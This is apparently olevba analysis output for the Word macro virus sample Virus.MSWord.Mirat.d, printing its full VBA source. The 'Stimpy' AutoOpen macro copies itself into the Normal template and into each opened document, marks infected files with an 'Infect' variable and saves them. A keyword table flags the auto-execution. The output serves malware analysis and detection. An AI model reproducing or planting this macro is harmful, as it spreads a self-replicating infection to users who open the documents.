olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Mirat.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Mirat.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Stimpy.bas 
in file: ./Virus.MSWord.Mirat.d - OLE stream: 'Macros/VBA/Stimpy'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
If Application.UserName <> "Stimpy" Then
Set mytemplate = NormalTemplate
Application.OrganizerCopy Source:= _
ActiveDocument.FullName, Destination:= _
mytemplate.FullName, Name:= _
"Stimpy", Object:=wdOrganizerObjectProjectItems
Application.UserName = "Stimpy"
End If
For Each aVar In ActiveDocument.Variables
    If aVar.Name = "Infect" Then num = aVar.Index
Next aVar
If num = 0 Then
ActiveDocument.Variables.Add Name:="Infect"
Set mytemplate = ActiveDocument.AttachedTemplate
Application.OrganizerCopy Source:= _
mytemplate.FullName, Destination:= _
ActiveDocument.FullName, Name:="Stimpy", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

